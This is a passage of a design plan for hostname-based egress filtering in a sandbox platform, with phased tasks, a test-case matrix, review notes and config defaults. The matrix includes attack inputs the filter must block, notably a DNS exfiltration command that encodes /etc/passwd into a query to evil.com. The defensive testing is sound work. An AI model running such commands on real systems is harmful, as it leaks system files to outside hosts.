- P1-1: `pkg/egresspolicy` (grammar with allow-wins precedence, matcher, SNI
  peek, dial control) plus moving isolate onto it (D4, D15). This also deletes
  the dead `internal/runtime/isolate` matcher (CQ4).
- P1-2: `internal/egress` core with the nft table and sets.
  - Source sets keyed by default verdict, plus `deny_cidr` (A8).
  - Owner-checked Detach (D5) and atomic set replace (D13).
  - Learned-element shadow map and per-op conns (D18).
  - The `Noop`.
- P1-2b: The `sandboxd egress-gateway` process (D9).
  - UDS protocol with a version handshake, and a policy snapshot (temp file,
    fsync, rename).
  - systemd unit shipped by install.sh, Terraform and Ansible.
  - sandboxd's `EnsureEgressGatewayReady` latch and full `Sync`.
- P1-3: `internal/egress/dnsfilter`, including the D2 learned-IP lifecycle
  (established accept, conntrack flush on narrowing, flush on Detach and reuse).
- P1-4: `internal/egress/proxy`: outer-SNI matching (D6), shared splice,
  connection caps (D17), and the input-chain drop for FQDN sources (D7).
- P1-5: Service chokepoint (`applySandboxEgress`), driver-facing request copy,
  attach/detach at every lifecycle site, and the block invariant.
- P1-6: WASM `MsgSetEgressPolicy` plus the mediator check.
- P1-7: Denied-egress audit (H5), with `Result`/`Reason` on egress events.
- P1-8: New docs page `docs/src/content/docs/egress-domain-filtering.mdx`, in
  five-language tabs and registered under "Network Usage" in
  `docs/src/content.config.ts:263-280`. It includes the explainable-denials
  troubleshooting section. Rewrite the `network-isolation.mdx:420` limitation.
  Add rows to `setup/config-defaults.md`.
- P1-9: E2B facade (D4, D11).
  - Accept hostnames in `network.allowOut`.
  - Map `allowOut` + `denyOut ["0.0.0.0/0"]` to allowlist mode, and pass mixed
    lists through with allow-wins.
  - `allowOut` alone stays an allowlist (stricter than E2B, documented).
  - `denyOut` all alone stays block-all.
  - Fix the stale "mutually exclusive" comment, and drop the WASM
    `notImplemented` (`pkg/api/e2b/handlers.go:782`).
  - The same PR covers the core D4 changes: `validateEgressPolicy` drops mutual
    exclusion, and netrules installs ACCEPTs above DROPs for mixed policies.
- P1-10: Integration UCs (§7), gated by a new `CapEgressFQDN`, on the
  containerd single-node, docker local-mode and gVisor scenarios, plus one
  iptables-legacy host probe (D16). Also the missing EGR-01/EGR-02 UCs
  (`integration-tests/suite/harness/catalogue_rows.go:142-151`).
- P1-11: Warm-pool DNS: parked containerd containers bind-mount a generated
  resolv.conf (D14).
- P1-14: Gateway → sandboxd audit event stream (spec review 1; required by D9
  and H5): ring buffer `SB_EGRESS_AUDIT_BUFFER`, drop-oldest counted, drained
  on reconnect, written through `emitEgressAudit`.
- P1-12: Gateway observability (D22). Also `aerolvm_egress_audit_dropped_total`
  and `aerolvm_egress_attach_failed_total`, which the gateway reports in its
  heartbeat and sandboxd exports.
  - Metrics: `aerolvm_egress_gateway_up`, `aerolvm_egress_gateway_sync_age_seconds`,
    `aerolvm_egress_denied_total{reason}` and `aerolvm_egress_fqdn_sandboxes`.
  - Alert `SandboxdEgressGatewayDown` in `setup/prometheus/sandboxd-alerts.yml`,
    plus a runbook entry in `setup/runbooks/`.
- P1-15: Operability package (CEO D24).
  - Grafana panels in `setup/grafana/`: gateway up, sync age, denials by
    reason, attach failures, held sandboxes, audit drops, proxy connections vs
    caps, DNS QPS.
  - Runbooks in `setup/runbooks/` for GatewayDown, TableLost, attach failures,
    audit drops and self-test failure.
  - OTEL trace context carried in UDS frames, with spans for Attach, Sync and
    PUT apply.
  - Structured log fields `sandbox_id`, `reason`, `rule`, `mode` on every
    gateway decision.
  - New alerts `SandboxdEgressAttachFailures` and `SandboxdEgressAuditDropped`.
- P1-13: Explainable denials (CEO D4).
  - The DNS filter adds RFC 8914 Extended DNS Error 15 "Blocked" with extra
    text `aerolvm egress policy: <name> not allowed`.
  - Port 80 returns a 403 whose body names the host and rule.
  - Port 443 sends a TLS `access_denied` alert before closing.
  - Docs gain a troubleshooting section using `GET /v1/sandboxes/{id}/audit` to
    list denials.
  - Tests: `dig` shows EDE 15; `curl http://` shows the 403 body; `curl https://`
    reports the alert.
  - **Fail fast everywhere (CEO D10):**
    - Forward-chain denials for FQDN sources use nft `reject`: TCP reset, and
      ICMP admin-prohibited for UDP.
    - QPS-capped queries get REFUSED with EDE 15.
    - `conn_cap` closes after a TLS `access_denied` alert.
    - The WASM mediator returns a typed error naming host and rule.
    - Isolate's 403 body names host and rule.
    - EF-56 covers each path.
  - **TLS alert mechanics:**
    - Go's TLS server writes its own `internal_error` alert when the
      `GetConfigForClient` callback fails. So the recording conn swallows writes
      during the peek, and the proxy hand-writes the alert record (level fatal,
      description 49 `access_denied`).
    - Reasons that get the alert: `sni_not_allowed`, `no_sni`, `blocked_ip`
      (after an SNI match), `blocked` and `conn_cap`.
- P1-16: Capability-aware placement (CEO D20, T35).
  - It ships in Phase 1 because that is where gateway-mode creates, and their
    failover recreates, first exist in cluster mode (eng re-review S8).
  - Rule-6 tests go in `placement_test.go`.
  - A no-op when cluster mode is off.

**Phase 2: live policy.** P2-1 the endpoint and service (§5.8, strict spec-first
commit, D10); P2-2 five SDKs; P2-3 CLI/MCP `--allow-host` (docs in `cli.mdx` and `mcp.mdx`); P2-4 docs (new page `egress-profiles-and-learn-mode.mdx` for profiles, built-ins, learn mode and the check endpoint, registered under "Network Usage"); P2-5 E2B
`updateNetwork` route (D19); P2-6 named egress profiles with cluster replication
(D21; CLAUDE.md rule 6 applies).

- P2-7: Learn mode (CEO D2).
  - Create or PUT with `network_egress_mode: "learn"` attaches the sandbox with
    allow-all but records every DNS name, SNI/Host and port.
  - `GET /v1/sandboxes/{id}/network/learned` returns a suggested `allow_out`
    (wildcards where a domain has many subdomains), which can be applied with
    PUT or saved as a named profile.
  - Never a default, and labeled in audit. 5 SDKs + docs.
  - Test: a learned list round-trips into a policy that lets the same workload
    pass.
- P2-8: Built-in profiles (CEO D3).
  - A versioned catalogue in `pkg/egresspolicy`: pypi, npm, github,
    huggingface, golang-proxy, crates, apt-ubuntu, docker-hub.
  - Usable anywhere a named profile is.
  - Each profile has an integration UC that runs the real tool (pip install,
    npm install, git clone…) through FQDN mode. A stale list fails closed.
  - **Versioning (CEO D11): pinned at create.**
    - The sandbox spec stores `builtin:<name>@<version>`; a request for a bare
      `builtin:<name>` is resolved to the node's current version at create.
    - Nodes keep every catalogue version they have shipped, so failover and
      reconcile reproduce the same list.
    - A bare `builtin:<name>` is pinned **on the owner node** (after any
      cluster forward).
    - If a pinned version is missing on a node (an older node during a rolling
      upgrade), that sandbox stays block-all with
      `egress_status: "unavailable"` (fail closed, G7) until it lands on a node
      that has the version.
    - Owners move to a newer list by updating the policy. A sandbox's reachable
      hosts never change underneath it.
    - The `builtin:` prefix is reserved, so user profile names can't collide.
  - **Freshness (CEO D12): operator-run only.** EF-49 runs in the AWS
    integration suite when operators run it; there is no scheduled job. This is
    an accepted shortcut: drift may reach users before operators see it.
    Upgrade trigger: the first user report of a stale built-in profile.
- P2-9: Policy check endpoint (CEO D5).
  - `POST /v1/network/policy/check {network_allow_out, network_deny_out, destination}`
    returns `{allowed, matched_rule, default_verdict}` from `pkg/egresspolicy`.
  - 5 SDK methods and docs.
  - Tests: table cases mirroring the matcher's.

**Phase 3 (fully specified in §5.9; gated on demand).**
- P3-1 inspection with method/path rules.
- P3-2 credential injection.
- P3-3 per-binary rules (runc only).

**Phase 2 dependencies:** P2-7 (saving a learned list as a profile) and P2-8
depend on P2-6.

**Phase 4: Firecracker** (CEO D14: kept in Phase 4).
- It starts by confirming Firecracker outbound egress on a live host. The
  TODOS.md "Audit Firecracker outbound NAT path" entry is partly stale:
  `ip_forward` is now enabled at bootstrap by the host-port forwarder, but no
  masquerade for the TAP subnet exists in the repo. Update the TODO with what
  the live host shows.
- Then lift the create gate (`service.go:2137-2145`) and plug TAP devices into
  the gateway (identity `iifname fctapN`).

**Runtime coverage matrix** (approved scope):

| Feature | docker | containerd | gVisor | WASM | isolate | Firecracker |
|---|---|---|---|---|---|---|
| Phase 0 hole fixes | yes | yes | yes | P0-1 (block-all at create) | P0-3 (validation) | n/a until Phase 4 |
| Hostname allowlists + DNS filter + SNI/Host check (Phase 1) | gateway | gateway | gateway | mediator | proxy | Phase 4 |
| Fail-fast, explained denials (Phase 1) | yes | yes | yes | typed error | 403 naming rule | Phase 4 |
| Live PUT, profiles, built-ins, learn mode, check endpoint (Phase 2) | yes | yes | yes | yes | yes | Phase 4 |
| Inspection + credential injection (Phase 3) | yes | yes | yes | unspecified (CEO D14) | yes (first) | unspecified (CEO D14) |
| Per-binary rules (Phase 3) | runc only | runc only | not possible (netstack hides processes) | not possible (no binaries) | not possible (no binaries) | not possible (VM opaque to host) |

---

## 7. Use cases (verification matrix)

| # | Use case | Expected | Covered by |
|---|---|---|---|
| EF-01 | `allow_out: ["pypi.org","*.pythonhosted.org"]`, run `pip install requests` | succeeds | integration |
| EF-02 | Same sandbox: `curl https://example.com` | refused by the proxy; denial audited | integration + proxy unit |
| EF-03 | `nslookup evil.com` / `dig @8.8.8.8 evil.com` | NXDOMAIN from the filter; nothing forwarded upstream | integration + dnsfilter unit |
| EF-04 | `dig TXT $(head -c30 /etc/passwd \| base32).evil.com` | NXDOMAIN; the query never leaves the host | dnsfilter unit + integration (upstream query log) |
| EF-05 | `curl --resolve pypi.org:443:<other Fastly IP> https://pypi.org` | proxy dials `pypi.org` itself; succeeds against the real pypi | proxy unit |
| EF-06 | `curl --resolve evil.com:443:<pypi IP> https://evil.com` | denied (SNI not allowed) | proxy unit |
| EF-07 | TLS with no SNI; GREASE-ECH hello with an allowed outer SNI; real-ECH hello whose outer SNI isn't allowlisted | denied / passes / denied (D6) | proxy unit (crafted hellos) |
| EF-08 | Plain HTTP keep-alive: request 1 `Host: pypi.org`, request 2 `Host: evil.com` | request 2 → 403 | proxy unit |
| EF-09 | `kdig +tls @1.1.1.1` (DoT); `curl --http3` (QUIC) | rejected immediately (CEO D10) | integration |
| EF-10 | `github.com:22`, then `git clone git@github.com:…` | succeeds over learned IPs; port 23 to the same IP is rejected | integration + nft fake |
| EF-11 | Direct IP `curl https://1.2.3.4` with no CIDR allow | rejected immediately (forward reject or proxy no-SNI alert) | integration |
| EF-12 | Allowlisted name resolves to 169.254.169.254 / 127.0.0.1 / 10.x | proxy refuses (always / always / unless CIDR-allowed) | dial-control unit |
| EF-13 | FQDN sandbox hits its byte-out quota, or gets block-all, mid-download | added to `@blocked_src` (forward + input drop) and stays in `fqdn_src`; its open proxied connections are closed and conntrack flushed; `DOCKER-USER` DROP stays as a second layer; the proxy denies on the blocked bit; quota unblock while block-all or a hold is set leaves it blocked (reason-keyed, D2) | service + gateway unit (block invariant regression) |
| EF-14 | `network_block_all` together with hostnames | block-all wins; nothing redirected | service unit |
| EF-15 | CIDR-only sandbox (today's path) | no gateway work; FORWARD rules and DNS byte-identical to today (Phase 0 still adds the `AEROLVM-INPUT` rule and the `CAP_NET_RAW` drop) | service regression test |
| EF-16 | sandboxd restart with FQDN sandboxes running | FQDN egress continues uninterrupted (the gateway is its own process, D9); on reconnect sandboxd pushes a full `Sync` that replaces sets atomically with no membership churn (D13) | gateway unit + integration |
| EF-17 | Gateway probe fails (old kernel) | FQDN create → 501 with a clear error; CIDR creates unaffected | bootstrap latch test |
| EF-18 | Concurrent first FQDN creates with gateway bootstrap pending | exactly one bootstrap (single-flight) | latch test (`layer4_bootstrap_test.go` shape) |
| EF-19 | Spoofed neighbour source IP (after P0-2) | packet cannot be sent (no NET_RAW) | integration |
| EF-20 | WASM `network_block_all:true`, no limits (H1) | dial refused from the first instruction | wasm service test |
| EF-21 | WASM `allow_out: ["example.com"]`; guest dials `example.com:443` / `1.2.3.4:443` / `example.com:443` with SNI `evil.com` | allowed / refused / refused | mediator unit |
| EF-22 | isolate `allow_out: ["*.example.com"]` | `api.example.com` allowed; `example.com` denied | isolate unit |
| EF-23 | Hostname entry on a Firecracker create | 501 (never silently ignored) | dispatch test |
| EF-24 | Wildcard on a public suffix (`*.com`, `*.github.io`) | 400 | egresspolicy unit |
| EF-25 | Cluster mode: allowlist pushes the spec past 4 KB | 400 `ErrRecoveryPayloadTooLarge` | service test |
| EF-26 | Cluster failover (`policy=recreate`) of an FQDN sandbox | the recreated sandbox gets the same policy (it rides the spec) | cluster service test |
| EF-27 | PUT narrows `pypi.org,github.com` → `pypi.org` while a github download is running | github connection closed; new github connections denied; pypi untouched | Phase 2 service + proxy test |
| EF-28 | Same PUT body sent twice, or two concurrent PUTs | idempotent; final firewall state matches the final row | Phase 2 service test |
| EF-29 | PUT on a sandbox owned by another node | forwarded to the owner; spec patched through Raft | Phase 2 cluster test |
| EF-30 | PUT whose apply fails | sandbox ends up block-all; 503; retry converges | Phase 2 service test |
| EF-31 | Warm-pool adopt (docker and containerd) of an FQDN create | park DROP held until Attach; never unrestricted | warm adopt tests |
| EF-32 | Byte quota on an FQDN sandbox | proxied bytes counted (eth0 counters) | netstats test |
| EF-33 | FQDN sandbox connects to sandboxd API / SSH gateway / cluster port on its gateway IP; host→sandbox toolbox exec | refused / still works (D7) | gateway unit + integration |
| EF-34 | Block-all and CIDR-allowlist sandboxes reach host services | refused; toolbox exec still works (P0-5, D8) | netrules unit + integration |
| EF-35 | New sandbox attaches on a recycled IP before the old owner's late Detach | new owner stays redirected and restricted; inherits no learned entries (D5, D2) | gateway unit |
| EF-36 | Mixed lists: `allowOut ["api.example.com"]` + `denyOut ["203.0.113.0/24"]`; `allowOut` alone; `denyOut` alone; allow + deny-all | allow wins; default deny; default accept; allowlist (D4) | egresspolicy + service + netrules + facade tests |
| EF-37 | One sandbox opens more than 512 proxied connections | excess closed immediately, `conn_cap` audited, other sandboxes unaffected (D17) | proxy unit |
| EF-38 | egress-gateway restarts with and without a snapshot; sandboxd restarts | set membership never observed empty; no snapshot → kernel sets untouched until `Sync` (D13, D9) | gateway unit (nft fake) + integration |
| EF-39 | egress-gateway down or version-skewed | FQDN create → 503; CIDR-only creates unaffected (D9) | service unit |
| EF-40 | Warm-adopted containerd sandbox resolves DNS, with and without FQDN mode | resolves (D14) | integration |
| EF-41 | Stop/destroy event for an old sandbox after its IP was reused | new owner's rules untouched (P0-6, D20) | service unit |
| EF-42 | E2B `updateNetwork` replace, repeat and deny-all mapping | matches PUT semantics (D19) | e2b facade tests |
| EF-43 | Named profile updated with sandboxes referencing it, single-node and cluster | every referencing sandbox re-applied; replication survives leader change (D21) | service + cluster regression test |
| EF-44 | Repeat DNS answer within half the learned timeout | no netlink write; past it, one refresh write (D18) | dnsfilter unit + microbenchmark |
| EF-45 | Isolate create with a hostname in `denyOut`; isolate with both lists | 400 naming the entry; allow wins (D15, D4) | service + isolate tests |
| EF-46 | egress-gateway stops heartbeating, then recovers | `aerolvm_egress_gateway_up` drops to 0 and back; `SandboxdEgressGatewayDown` fires after 1 minute with FQDN sandboxes present (D22) | service unit + alert rule test |
| EF-47 | Denied name, denied plain HTTP host, denied HTTPS host | `dig` shows EDE 15 "Blocked" with reason text; `curl http://` gets a 403 naming host and rule; `curl https://` reports TLS `access_denied` (CEO D4) | dnsfilter + proxy unit + integration |
| EF-48 | Learn-mode run of `pip install requests`, then lock with the learned list | learned list contains pypi.org and files.pythonhosted.org; the same workload passes under the locked policy; audit marks learn mode (CEO D2) | service + integration |
| EF-49 | Each built-in profile with its real tool (pip, npm, git clone, huggingface-cli, go mod download, cargo fetch, apt-get, `crane pull`) | succeeds under FQDN mode with only that profile (CEO D3; crane rather than `docker pull`, which would need Docker-in-Docker) | integration (one UC per profile) |
| EF-50 | Policy check: `*.github.com` against `api.github.com` and `github.com`; mixed lists | allowed / not allowed (apex), with matched rule and default verdict (CEO D5) | API + 5 SDK tests |
| EF-51 | A sandbox with no policy tries to send a UDP packet with a neighbour's source IP | send fails (`CAP_NET_RAW` dropped for every sandbox, CEO D8) | integration |
| EF-52 | Phase 3: `inspect` rule allows `GET /repos/acme/*` and denies `POST` | GET passes, POST denied with 403 (P3-1) | proxy unit + integration |
| EF-53 | Phase 3: inspected host with `Host` different from SNI | rejected; domain fronting closed (P3-1) | proxy unit |
| EF-54 | Phase 3: credential injection | upstream receives the real header; the placeholder never leaves; audit redacts the value; a missing `secret_ref` is denied (P3-2) | proxy unit + integration |
| EF-55 | Phase 3: `binaries: [/usr/bin/pip]` | pip allowed and curl denied on runc; 501 on gVisor, Firecracker, WASM and isolate (P3-3) | proxy unit + integration |
| EF-56 | Fail-fast paths: raw-IP connect, unlisted port, QPS cap, `conn_cap`, WASM dial, isolate request | TCP reset or ICMP admin-prohibited immediately; REFUSED + EDE 15; TLS `access_denied`; typed WASM error; isolate 403 naming the rule (CEO D10) | dnsfilter + proxy + mediator + isolate unit + integration |
| EF-57 | `allow_out: ["10.0.0.0/8","pypi.org"]` and `dig @<VPC resolver in 10/8> evil.com` | answered by the filter with NXDOMAIN; no query leaves to the VPC resolver | dnsfilter + integration |
| EF-58 | Gateway node preconditions: bridged sandbox-to-sandbox DNS/HTTP; privileged-enabled node; IPv6 on the bridge | bridged traffic is redirected and filtered; gateway-mode create → 501 on privileged or IPv6 nodes (CEO D18) | self-test unit + integration |
| EF-59 | Out-of-band `docker start` of a stopped CIDR or gateway-mode sandbox | egress rules re-applied by the start event, not after the next reconcile (P0-4/H4) | events unit + integration |
| EF-60 | `builtin:pypi` pinned at create; failover to a node with that version; to a node without it | the same list on recreate; missing version → held with `egress_status:"unavailable"` (CEO D11) | service + cluster test |
| EF-61 | Delete a profile in use; profile PUT pushing a referencing sandbox past 1024; both racing a create on another worker | 409 with the sandbox named; FSM resolves races the same everywhere (CEO D19) | FSM + service test |
| EF-62 | Learn-mode sandbox exceeds `SB_EGRESS_LEARN_MAX`; FQDN sandbox exceeds `SB_EGRESS_LEARNED_MAX` | recording stops, `truncated:true`; new names past the learned cap get REFUSED + EDE 15 "learned cap" and an audit event | dnsfilter + gateway unit |
| EF-63 | sandboxd at protocol N with gateway at N-1, and the reverse; a gap of 2 | everything works at N/N-1; at a gap of 2 gateway-mode creates get 503 while Detach still works | UDS protocol test |
| EF-64 | Hold paths: limits PATCH on a held sandbox; transition on a quota-blocked sandbox; Noop attach; replay of a now-invalid entry; restart with a stale snapshot; a failed PUT on an attached sandbox (redirect path, S3); every interleaving of the iptables DROP and `@blocked_src` writes, including a failed DROP insert (D2) | stays shut in every case (CEO D16, eng re-review D2); a gateway restart keeps long-lived CIDR flows | service + gateway unit |
| EF-65 | nft table deleted under a running gateway-mode sandbox | egress shut within 5 s, restored after the rebuild, alert fires (CEO D17) | gateway unit + integration |
| EF-66 | Mixed cluster with one gateway-incapable node | gateway-mode creates and recreates avoid it; none capable → 503 (CEO D20) | placement_test |
| EF-67 | Sandbox on a user-defined `SB_DOCKER_NETWORK` | DNS filtered and HTTPS proxied (CEO D21) | integration |
| EF-68 | Non-sandboxd process connects to the gateway socket; gateway unit privileges | rejected; the unit runs as `aerolvm-egress` without root (CEO D22) | gateway unit |
| EF-69 | Attach racing a quota `SetBlocked`, in both completion orders | the blocked sandbox never leaves `@blocked_src` while a reason is set (Section 4, eng re-review D2) | gateway unit with pause points |
| EF-70 | Over-cap :443 connection; firewall rejects; learn-mode non-80/443 flow | alert sent without reading the hello; `firewall_reject` audited; the flow appears in learned `host:port` (spec review 3 F2, C9, F3) | proxy + gateway unit |
| EF-71 | Go native fuzz targets: SNI peek, HTTP Host parsing, DNS message handling, policy grammar | no panics or hangs; short mode in CI, longer nightly (CEO D23) | fuzz |
| EF-72 | Chaos: kill the gateway mid-download; `nft flush ruleset`; restart sandboxd mid-traffic | stays fail-closed throughout and recovers (CEO D23) | integration (D16 scenarios) |
| EF-73 | Load: DNS filter at the QPS cap, proxy at 16k connections, profile fan-out at 50 sandboxes/s | baselines recorded in the benchmark harness; no collapse at the caps (CEO D23) | benchmark |
| EF-74 | Profile PUT during a rolling upgrade: one Raft server with `fv` below the profile-ops version (live, then failed with old last-known meta, then absent from gossip); all upgraded; `nodeMeta` encoded with every field at maximum length | 503 `ErrClusterVersion` in the first three cases; accepted when all report it; encoded meta stays under memberlist's 512 bytes (eng re-review D1) | gossip + FSM test (rule 6) |
| EF-75 | Gateway restarts while sandboxd is down; sandboxd later reports a new bridge | listeners bind from the snapshot's bridge list; the new bridge is bound and self-tested when reported; the gateway never opens the docker socket (eng re-review S5) | gateway unit |
| EF-77 | One sandbox fills `@rejected_flows` to its size (port scan to unique destinations); another allowlist-mode sandbox then connects to a raw IP and an unlisted port | the second sandbox's flows are still rejected; the scan's inserts are metered; `aerolvm_egress_audit_dropped_total{reason="set_full"}` rises (eng re-review S10) | gateway nft test against a real kernel netns (integration tag) + backend fake for rule shape |
| EF-76 | Learn mode on docker, WASM and isolate for the same traffic | identical `suggested_allow_out` from the shared `Recorder`; a debounced snapshot rewrites only the changed sandbox's file (eng re-review S7, S9) | egresspolicy unit + gateway unit |

Engine assignment: EF-47, EF-48, EF-49, EF-51 and EF-56 run in the D16
`CapEgressFQDN` scenarios (containerd, docker, gVisor). EF-52 to EF-55 run when
Phase 3 starts.

---

## 8. pr-review.md axes (pre-filled)

1. **Idempotency.**
   - `Attach`/`Update` are set-element upserts; nft `add element` on an existing
     key refreshes it.
   - Learned inserts refresh the TTL.
   - PUT is a full replace under a per-sandbox mutex.
   - Profile PUT is a full replace; re-applying an unchanged profile is a no-op
     per sandbox.
   - Toggling learn mode re-attaches via BlockAll → Attach → clear BlockAll (or hold on failure, D16),
     which is safe to retry.
   - No pool or port allocation.
2. **Boot-path latency.** **Call-out required.**
   - Non-gateway creates add one `hasHostnames()` scan (no I/O).
   - Block-all and CIDR-allowlist creates add one `AEROLVM-INPUT` rule insert
     (P0-5), the same cost as an existing netrules op.
   - Creates that reference profiles add one profile lookup plus `builtin:`
     version pinning. That is a store or FSM read on server-tier nodes, a local
     cache read on dedicated workers, and one server-tier RPC on a worker cache
     miss (failure → 503).
   - Learn-mode creates add the same Attach as FQDN creates.
   - FQDN creates add:
     - one UDS round-trip to the egress-gateway process (D9; expected sub-ms);
     - one nft netlink batch inside the gateway (expected sub-ms);
     - one extra `ClearBlockAllEgress` (an existing rule op);
     - on Attach failure only: one `egress_hold` store write plus one `sbx-egress-hold` rule insert (D16), off the success path.
   - First-call case: if the boot-time connect failed, the first FQDN create
     runs it (UDS connect, version handshake and full `Sync`, expected low ms)
     behind the latch.
   - Warm containerd parks gain one resolv.conf bind mount at park time (D14),
     which is off the create path.
   - Measure with the existing single-node benchmark before and after.
3. **Lazy bootstrap.** `EnsureEgressGatewayReady`: atomic.Bool + mutex,
   best-effort at daemon start, retried on the first FQDN create. A failure
   leaves the latch unset.
4. **Failure-path consistency.** No Caddy involvement.
   - Create: driver DROP → Attach → clear DROP. If Attach fails or the gateway
     is unreachable, the create fails with 503 and the container is removed.
   - PUT: cluster spec commit first and strict (D10), then store, then apply. A
     commit failure → 503 `spec_commit_failed` with nothing changed; an apply
     failure → held (D16) plus 503 `apply_failed_held`.
   - Gateway restarts replace set contents atomically (D13).
   - Every intermediate state is fail-closed.
5. **TCP host-port pool & L4.** Untouched. Our own nft table; no changes to
   `hostport` chains, `TryReserveHostPort` or `EnsureLayer4`.
6. **Cluster.** Phase 1 has no FSM or gossip changes. It does change placement
   and the capacity heartbeat: capability-aware placement (CEO D20, P1-16) is a
   rule-6 change with tests in `placement_test.go`. Phase 2 changes the FSM
   (profiles, CEO D19) and gossip `nodeMeta` (`fv`, eng re-review D1).
   - Policy rides the existing spec fields.
   - PUT uses `clusterForwardWrap` + a **strict** `UpsertSpec` commit (D10).
   - Gateway state is per-node kernel and memory, rebuilt from local rows via
     `Sync`.
   - `Noop` when the feature is off. Single-node is unaffected.
   - Heterogeneous gateway capability across nodes: capability-aware placement (CEO D20).
   - **Phase 2 named profiles (D21) do touch replicated state.** They need
     CLAUDE.md rule 6: a regression test next to the changed cluster file and a
     PR call-out on split-brain, replay safety and leader change, and a no-op
     when `cfg.EnableCluster` is false.
7. **Scale (2000 nodes × 100k sandboxes).** Per-node state is proportional to
   local sandboxes; per-sandbox cost is set elements, not rules. The DNS and
   proxy listeners are per node.
   - The only fleet-wide fan-out is a profile update (D21). Each owner node
     re-applies to its own referencing sandboxes after the FSM apply,
     rate-limited per node, with no cross-node RPC.
   - A failed re-apply fails that sandbox closed (§5.8 Phase 2 wire contract).
- **Coverage.** New packages `pkg/egresspolicy`, `internal/egress`,
  `internal/egress/dnsfilter`, `internal/egress/proxy` and `internal/netsplice`
  get tests in the table-driven style. `TestSpliceConnsWritesBufferedPrefixFirst`
  moves with the splice. The nft layer sits behind a backend seam with an in-memory
  fake, like `netrules.RuleBackend`. Live behaviour goes in `integration-tests/`
  behind the build tag. Keep every package ≥85% (run `/maintain-coverage`).

---

## 9. Config (rows for `setup/config-defaults.md`)

| Flag | Default | Why |
|---|---|---|
| `SB_EGRESS_FQDN_ENABLED` | `true` (CEO D25) | Inert until a sandbox enters gateway mode: idle cost is one nft table and two listeners bound to bridge gateway IPs. Off means gateway-mode requests get 501. |
| `SB_EGRESS_DNS_PORT` | `53054` | Internal; reachable only through REDIRECT (input guard). |
| `SB_EGRESS_PROXY_PORT` | `15080` | Same. |
| `SB_EGRESS_DNS_UPSTREAMS` | host resolver | Override for air-gapped or corporate DNS. |
| `SB_EGRESS_DNS_QPS` | `50` | Per-sandbox DNS rate limit. |
| `SB_EGRESS_LEARNED_MAX` | `512` | Per-sandbox learned (IP, port) cap; past it, fail closed. |
| `SB_EGRESS_PROXY_MAX_CONNS_PER_SANDBOX` | `512` | Per-sandbox proxied connection cap, so one sandbox can't exhaust the node's gateway (D17). |
| `SB_EGRESS_PROXY_MAX_CONNS` | `16384` | Per-node proxied connection cap (D17). |
| `SB_EGRESS_GATEWAY_SOCKET` | `/run/aerolvm/egress-gateway.sock` | UDS between sandboxd and the egress-gateway process (D9). |
| `SB_EGRESS_AUDIT_BUFFER` | `10000` | Gateway-side audit event ring buffer; oldest dropped and counted when full (spec review 1). |
| `SB_EGRESS_LEARN_MAX` | `1024` | Per-sandbox learn-mode recording cap (P2-7). |
| `SB_EGRESS_PROFILE_APPLY_QPS` | `50` | Per-node rate of profile re-applies to local sandboxes (P2-6). |

---

## 10. Open questions for review

1. ~~**E2B parity.**~~ **Resolved (review S3).** E2B accepts domains in
   `allowOut`: HTTP 80 by Host, TLS 443 by SNI; `*.x` at any depth, not the
   apex; allow wins over deny; it auto-allows 8.8.8.8 for DNS (this plan filters
   DNS instead); `updateNetwork` replaces the config. P1-9 and P2-5 follow these
   semantics.
2. ~~**Hostnames in deny lists.**~~ **Resolved (S3, D15).** Rejected on every
   runtime, matching E2B.
3. ~~**Drop `CAP_NET_RAW` for every sandbox.**~~ **Resolved (CEO D8).** Yes:
   dropped for every docker and containerd sandbox (P0-2).
4. **IPv6.** Phase 1 answers AAAA with NODATA and relies on sandboxes having no
   v6 route (true for default docker0 and the aerolvm0 conflist). Add an
   explicit `ip6` drop keyed on the veth once P0-2 provides interface identity?
5. ~~**Big allowlists in cluster mode.**~~ **Resolved (D21).** Named egress
   profiles are built in Phase 2 (P2-6).
6. ~~**In-process vs out-of-process gateway.**~~ **Resolved (D9).** A separate
   `sandboxd egress-gateway` process under its own systemd unit.
7. ~~**Mixed clusters.**~~ **Resolved (CEO D20):** capability-aware placement. If some nodes fail the nft probe, should placement learn a
   capability bit (gossip, which is fragile), or is "homogeneous fleet required,
   probe failure = node refuses FQDN creates" enough for Phase 1?
8. ~~**Default for `SB_EGRESS_FQDN_ENABLED`.**~~ **Resolved (CEO D25): on by default.** On (inert until used) or off
   (operator opt-in like the warm pools)? Recommendation: on, because it holds
   no resources per sandbox until used.
9. ~~**Hosts with INPUT policy DROP.**~~ **Resolved (spec review 2).** The
   gateway's startup self-test detects it, and the node reports the gateway as
   unavailable (gateway-mode creates get 501). The docs explain the accept rule
   an operator must add; install.sh doesn't change host firewalls.
10. **Docker user-defined networks** (`SB_DOCKER_NETWORK != bridge`). Embedded DNS
    at 127.0.0.11 forwards from inside the container netns, so the query should
    still exit eth0 and be redirected. Verify on a live host.

---

## 11. Verified against code (anchors)

- CIDR-only validation `internal/service/service.go:6480`; runtime dispatch
  before it at `:1694/1708/1723`; call at `:1836`.
- netrules policy `pkg/docker/netrules/manager.go:286`; comment tag `:275`;
  netlink backend filter-only `netlink_backend.go:228-230`; chains
  `manager.go:101-102`.
- Egress re-apply: `service.go:2871,2890` (start), `:5106,5133` (reconcile);
  clear `pkg/docker/events.go:195,268`; driver sites `pkg/docker/client.go:677,689`,
  `internal/runtime/containerd/lifecycle.go:295,301`, adopt
  `pkg/docker/docker_pool.go:451-461`, `internal/runtime/containerd/warm_adopt.go:267-281`.
- containerd resolv.conf `internal/runtime/containerd/hosts.go:52`, mount
  `lifecycle.go:614`; warm park without it `warm_park.go:179-182`.
- Firecracker gate `service.go:2137-2145`; TAP /30 slots
  `internal/network/tap/pool.go:119-130`; NAT gap `TODOS.md:378`.
- WASM dial `pkg/wasm/wazero_network.go:125` → `pkg/wasm/worker/netmediator.go:95`;
  block-only policy `worker/server.go:483-491`; H1 `internal/service/wasm.go:181`,
  `wasm_network.go:48`, `netstats.go:137`.
- Isolate proxy `pkg/isolate/egress.go:173-221`, matcher `:287`, SSRF dial
  control `:258`; live replace `:34`.
- Spoofing surface `internal/runtime/containerd/security.go:30`.
- Metering `pkg/docker/netstats/reader.go` (per-netns eth0 counters).
- Audit `internal/service/secret_audit.go:2489,2521`; allowed-only.
- Limits API template `pkg/api/v1/handlers.go:437` → `internal/service/netstats.go:97`;
  cluster forward `pkg/api/v1/cluster_handler.go:57`; spec patch
  `internal/service/cluster_secrets.go:31`.
- Recovery cap `internal/cluster/recovery_replication.go` (`inlineRecoveryMaxBytes = 4096`).
- L4 latch template `internal/service/service.go:319-320,3770`.
